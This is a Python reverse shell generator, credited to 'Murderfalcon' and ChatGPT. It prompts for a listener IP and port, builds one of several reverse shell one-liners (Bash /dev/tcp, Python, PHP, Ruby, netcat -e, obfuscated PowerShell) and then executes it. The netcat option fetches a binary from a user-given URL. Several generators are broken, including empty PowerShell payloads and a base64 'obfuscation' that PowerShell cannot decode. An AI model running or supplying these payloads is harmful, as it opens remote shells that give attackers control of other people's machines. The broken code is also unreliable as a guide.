# Start of program
# Author Murderfalcon AKA Charles Lerant and chatGPT
#Still needs lots of work!!!

import subprocess
import urllib.request
import base64
import os
import sys
import re
from Crypto.Cipher import AES

print(r"""
  _____           _      _           _____ _          _ _     
 |  __ \         | |    | |         / ____| |        | | |    
 | |__) |__ _  __| | ___| | _______| (___ | |__   ___| | |____
 |  _  // _` |/ _` |/ _ \ |/ /______\___ \| '_ \ / _ \ | |_  /
 | | \ \ (_| | (_| |  __/   <       ____) | | | |  __/ | |/ / 
 |_|  \_\__,_|\__,_|\___|_|\_\     |_____/|_| |_|\___|_|_/___|
                                                              
                                                              
""")



def generate_obfuscated_powershell(reverse_shell_payload):
    # Encodes payload in base64 and replaces some characters with alternative representations
    encoded_payload = base64.b64encode(reverse_shell_payload.encode('utf-8')).decode('utf-8')
    encoded_payload = encoded_payload.replace('=', '')
    encoded_payload = encoded_payload.replace('+', '$a')
    encoded_payload = encoded_payload.replace('/', '$b')
    encoded_payload = encoded_payload.replace('\\', '$c')
    encoded_payload = encoded_payload.replace('\n', '$d')

    # Generates obfuscated PowerShell script
    obfuscated_script = 'powershell -e ' + encoded_payload
    return obfuscated_script


def generate_powershell(reverse_shell_payload):
    # Generates non-obfuscated PowerShell script
    powershell_script = 'powershell -c "' + reverse_shell_payload + '"'
    return powershell_script


def generate_command_prompt(reverse_shell_payload):
    # Generates command prompt reverse shell command
    cmd_shell_command = 'cmd.exe /c "' + reverse_shell_payload + '"'
    return cmd_shell_command


def generate_ruby(reverse_shell_payload):
    # Generates Ruby reverse shell command
    ruby_command = 'ruby -rsocket -e\'f=TCPSocket.open("' + listen_ip + '",' + str(listen_port) + ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
    return ruby_command


def generate_bash(reverse_shell_payload):
    # Generates Bash reverse shell command
    bash_command = 'bash -c "exec /bin/bash -i &>/dev/tcp/' + listen_ip + '/' + str(listen_port) + ' <&1"'
    return bash_command


def generate_python(reverse_shell_payload):
    # Generates Python reverse shell command
    python_command = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + listen_ip + '",' + str(listen_port) + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
    return python_command
    
def generate_python3(reverse_shell_payload):
    # Generates Python reverse shell command
    python_command = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + listen_ip + '",' + str(listen_port) + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
    return python_command


def generate_php(reverse_shell_payload):
    # Generates PHP reverse shell command
    php_command = 'php -r \'$sock=fsockopen("' + listen_ip + '",' + str(listen_port) + ');exec("/bin/sh -i <&3 >&3 2>&3");\''
    return php_command


def generate_netcat(reverse_shell_payload):
    # Downloads netcat binary
    url = input("Enter URL for netcat binary: ")
    filename = input("Enter filename to save netcat binary as: ")
    urllib.request.urlretrieve(url, filename)

    # Generates Netcat reverse shell command
    netcat_command = './' + filename + ' ' + listen_ip + ' ' + str(listen_port) + ' -e /bin/bash'
    return netcat_command




#Prompts user for IP address and port to listen on

listen_ip = input("Enter listener ip address: ")
listen_port = int(input("Enter listener port: "))

#Presents user with reverse shell options

reverse_shell_options = {
'1': ('Obfuscated PowerShell', generate_obfuscated_powershell),
'2': ('PowerShell', generate_powershell),
'3': ('Command Prompt', generate_command_prompt),
'4': ('Ruby', generate_ruby),
'5': ('Bash', generate_bash),
'6': ('Python', generate_python),
'7': ('Python3', generate_python3),
'8': ('PHP', generate_php),
'9': ('Netcat', generate_netcat)
}

print('Select a reverse shell option:')
for option, (description, _) in reverse_shell_options.items():
    print(f'{option}: {description}')
selected_option = input()

#Validates user's selected option

while selected_option not in reverse_shell_options:
    print('Invalid option. Please select a valid option.')
    selected_option = input()

#Generates payload using selected reverse shell option

reverse_shell_payload_generator = reverse_shell_options[selected_option][1]
reverse_shell_payload = reverse_shell_payload_generator('')

subprocess.Popen(reverse_shell_payload, shell=True)